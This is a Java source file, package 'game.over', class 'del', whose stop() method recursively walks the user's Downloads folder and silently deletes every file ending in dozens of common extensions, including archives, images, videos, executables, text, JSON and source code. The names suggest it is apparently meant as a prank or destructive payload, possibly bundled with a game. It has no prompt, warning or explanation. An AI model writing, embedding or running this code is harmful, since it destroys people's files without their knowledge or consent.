package game.over;

import java.io.File;

public class del {
    public static void stop() {
        String directoryPath = System.getProperty("user.home") + "/Downloads";
        File directory = new File(directoryPath);

        if (directory.exists()) {
            deleteFilesWithExtensions(directory, ".jar", ".mp4", ".mp3", ".zip", ".rar", ".7z", ".png", ".jpg", ".exe", ".gz", ".rar", ".csv", ".vpk", ".bat", ".java", ".kt", ".html", ".htm", ".txt", ".json", ".dll");
        }
    }

    public static void deleteFilesWithExtensions(File directory, String... extensions) {
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteFilesWithExtensions(file, extensions);
                } else {
                    String fileName = file.getName().toLowerCase();
                    for (String extension : extensions) {
                        if (fileName.endsWith(extension.toLowerCase())) {
                            file.delete();
                            break;
                        }
                    }
                }
            }
        }
    }
}
